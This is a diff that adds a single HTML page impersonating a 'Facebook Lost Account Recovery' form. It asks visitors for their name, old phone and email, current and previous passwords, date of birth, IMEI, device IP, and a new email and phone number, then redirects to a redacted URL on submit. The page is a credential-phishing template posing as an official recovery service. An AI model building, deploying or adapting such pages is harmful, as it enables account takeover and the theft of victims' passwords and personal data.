@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Recvr</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            zoom: 0.9; /* Zoom out the page slightly */
+        }
+        .container {
+            width: 100%;
+            max-width: 300px; /* Increased max-width for better spacing */
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fefffd;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        /* Desktop view ke liye CSS */
+        @media (min-width: 768px) {
+            .container {
+                max-width: 50vw; /* Half screen width for desktop view */
+            }
+        }
+        /* iPhone (Portrait) के लिए CSS */
+        @media only screen and (max-width: 480px) {
+            .container {
+                max-width: 90%; /* पेज को पूरी चौड़ाई में दिखाएं */
+                padding: 10px; /* पैडिंग कम करें */
+            }
+            h1 {
+                font-size: 24px; /* हेडिंग का साइज़ थोड़ा कम करें */
+            }
+            input[type="text"], select, input[type="file"], textarea {
+                font-size: 16px; /* इनपुट फ़ील्ड का फ़ॉन्ट साइज़ बढ़ाएं */
+            }
+            input[type="submit"] {
+                font-size: 16px; /* सबमिट बटन का फ़ॉन्ट साइज़ बढ़ाएं */
+            }
+        }
+        h1 {
+            color: rgb(0, 17, 255);
+            font-weight: bold;
+            text-align: center;
+            font-size: 28px;
+            margin-bottom: 20px;
+        }
+        label {
+            font-weight: bold;
+            display: block;
+            margin: 10px 0 5px;
+        }
+        input[type="text"], select, textarea {
+            width: calc(100% - 2px);
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        input[type="submit"] {
+            width: 100%;
+            background-color: green;
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: transform 0.3s;
+            margin-bottom: 10px;
+        }
+        input[type="submit"]:hover {
+            background-color: darkgreen;
+            transform: scale(1.05);
+        }
+        .additional-password-container {
+            display: none;
+            margin-top: 10px;
+        }
+        .os-info-container {
+            display: none;
+            margin-top: 10px;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            display: none;
+        }
+        .optional {
+            color: green;
+            opacity: 0.5;
+            font-size: 12px;
+        }
+        .info {
+            color: green;
+            opacity: 0.5;
+        }
+        footer iframe {
+            width: 100%;
+            max-width: 300px;
+            height: 30px;
+            border: none;
+            background: transparent;
+            overflow: hidden;
+        }
+        .show-password-container {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .show-password-container input[type="checkbox"] {
+            margin-right: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Facebook Lost Account Recovery</h1>
+        <form id="transferForm" enctype="multipart/form-data" onsubmit="return submitForm(event)">
+            <label for="name">Name</label>
+            <input type="text" id="name" name="name" placeholder="Enter your Facebook ID Full Name" required pattern="^[a-zA-Z\s\W]+$" title="Only letters and special characters are allowed" oninput="validateName()">
+
+            <label for="loginId">Phone Number</label>
+            <input type="text" id="loginId" name="loginId" placeholder="Enter your old phone number" required pattern="\d{}" title="Please enter a valid phone number">
+
+            <label for="loginId2">Email ID</label>
+            <input type="text" id="loginId2" name="loginId2" placeholder="Enter your old email" required>
+
+            <label for="password">Password</label>
+            <input type="password" id="password" name="password" placeholder="Enter your previous password" required oninput="checkPasswordLength()">
+            <div class="show-password-container">
+                <input type="checkbox" id="showPassword" onclick="togglePasswordVisibility()">
+                <label for="showPassword">Show Password</label>
+            </div>
+            <div class="error-message" id="passwordError">Please enter your correct previous password</div>
+
+            <div class="additional-password-container" id="additionalPasswordContainer">
+                <label for="previousPassword">One More Previous Password <span class="optional">(Optional)</span></label>
+                <input type="password" id="previousPassword" name="previousPassword" placeholder="Enter one more previous password">
+            </div>
+
+            <label for="dateOfBirth">Date of Birth <span class="optional">(Optional)</span></label>
+            <input type="date" id="dateOfBirth" name="dateOfBirth" oninput="validateDate()" />
+
+            <label for="systemOs">System OS</label>
+            <select id="systemOs" name="systemOs" required onchange="showOsInfo()">
+                <option value="" disabled selected>Select your operating system</option>
+                <option value="Android">Android</option>
+                <option value="iOS">iOS</option>
+                <option value="Windows">Windows</option>
+                <option value="macOS">macOS</option>
+                <option value="Linux">Linux</option>
+                <option value="Other">Other</option>
+            </select>
+
+            <div class="os-info-container" id="osInfoContainer">
+                <input type="text" id="imei" name="IMEI" placeholder="Enter your IMEI number">
+            </div>
+
+            <label for="deviceIp1">Device IP</label>
+            <input type="text" id="deviceIp1" name="deviceIp1" placeholder="Enter your IP address" required>
+            
+            <label for="newEmailId">New Email</label>
+            <input type="text" id="newEmailId" name="newEmailId" placeholder="Add new email address" required>
+
+            <!-- New Phone Number and Email ID Section -->
+            <label for="newPhoneNumber">New Phone Number</label>
+            <input type="text" id="newPhoneNumber" name="newPhoneNumber" placeholder="Add new phone number" required>
+
+            <label for="deviceIp1">Contact Email</label>
+            <input type="text" id="deviceIp1" name="deviceIp1" placeholder="Enter any email address" required>
+
+            <label for="additionalInfo">Additional Information <span class="optional" style="color: red; font-size: 12px;">(Optional)</span></label>
+            <textarea id="additionalInfo" name="additionalInfo" rows="4" placeholder="Enter any additional information about your account" style="width: calc(100% - 22px); padding: 10px; color: green; font-size: 12px;"></textarea>
+
+            <input type="submit" value="Proceed">
+        </form>
+    </div>
+
+    <script>
+        function checkPasswordLength() {
+            const passwordInput = document.getElementById("password").value;
+            const additionalPasswordContainer = document.getElementById("additionalPasswordContainer");
+            const passwordError = document.getElementById("passwordError");
+
+            if (passwordInput.length > 6) {
+                additionalPasswordContainer.style.display = "block";
+                passwordError.style.display = "none";
+            } else {
+                additionalPasswordContainer.style.display = "none";
+                passwordError.style.display = "none";
+            }
+        }
+
+        function showOsInfo() {
+            const osSelect = document.getElementById("systemOs");
+            const osInfoContainer = document.getElementById("osInfoContainer");
+            const selectedValue = osSelect.value;
+
+            if (selectedValue === "Android" || selectedValue === "iOS" || selectedValue === "Other") {
+                osInfoContainer.style.display = "block";
+                document.getElementById("imei").placeholder = selectedValue === "Other" ? "Please describe..." : "Enter your IMEI number";
+            } else {
+                osInfoContainer.style.display = "none";
+            }
+        }
+
+        function validateDate() {
+            const dateInput = document.getElementById("dateOfBirth");
+            const selectedDate = new Date(dateInput.value);
+            const year = selectedDate.getFullYear();
+
+            if (dateInput.value.length > 10) {
+                dateInput.value = dateInput.value.slice(0, 10);
+            }
+
+            if (year < 1950 || year > 2025) {
+                dateInput.setCustomValidity("Your date of birth may be incorrect, please enter the correct date.");
+            } else {
+                dateInput.setCustomValidity("");
+            }
+        }
+
+        function validateName() {
+            const nameInput = document.getElementById("name");
+            const pattern = /^[a-zA-Z\s\W]+$/;
+
+            if (!pattern.test(nameInput.value)) {
+                nameInput.setCustomValidity("I think your name isn't correct");
+            } else {
+                nameInput.setCustomValidity("");
+            }
+        }
+
+        function submitForm(event) {
+            event.preventDefault();
+
+            const passwordInput = document.getElementById("password").value;
+            const passwordError = document.getElementById("passwordError");
+
+            if (passwordInput.length < 6) {
+                passwordError.style.display = "block";
+                return false;
+            }
+
+            // Redirect directly to the specified URL
+            window.location.href = "########";
+            return true;
+        }
+
+        function togglePasswordVisibility() {
+            const passwordField = document.getElementById("password");
+            const previousPasswordField = document.getElementById("previousPassword");
+            const showPasswordCheckbox = document.getElementById("showPassword");
+
+            if (showPasswordCheckbox.checked) {
+                passwordField.type = "text";
+                previousPasswordField.type = "text";
+            } else {
+                passwordField.type = "password";
+                previousPasswordField.type = "password";
+            }
+        }
+    </script>
+</body>
+</html>
